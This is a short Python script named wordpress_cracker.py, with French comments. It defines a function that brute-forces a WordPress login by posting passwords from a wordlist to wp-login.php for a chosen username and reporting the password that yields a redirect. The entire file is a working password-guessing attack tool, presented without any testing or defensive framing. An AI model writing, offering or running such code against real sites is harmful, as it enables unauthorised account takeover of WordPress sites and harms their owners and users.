# wordpress_cracker.py

import requests

def wp_login_brute_force(url, username, wordlist):
    """
    Brute-force WordPress en testant chaque mot de passe depuis une wordlist.
    
    - url : URL complète de wp-login.php
    - username : login cible (ex: 'admin')
    - wordlist : liste de mots de passe à tester
    """
    session = requests.Session()

    for password in wordlist:
        data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': '/wp-admin/',
            'testcookie': '1'
        }

        try:
            response = session.post(url, data=data, allow_redirects=False)
            if response.status_code == 302:
                print(f"[✔] Mot de passe WordPress trouvé : {password}")
                return password
        except Exception as e:
            print(f"[!] Erreur : {e}")

    print("[✘] Aucun mot de passe WordPress trouvé.")
    return None
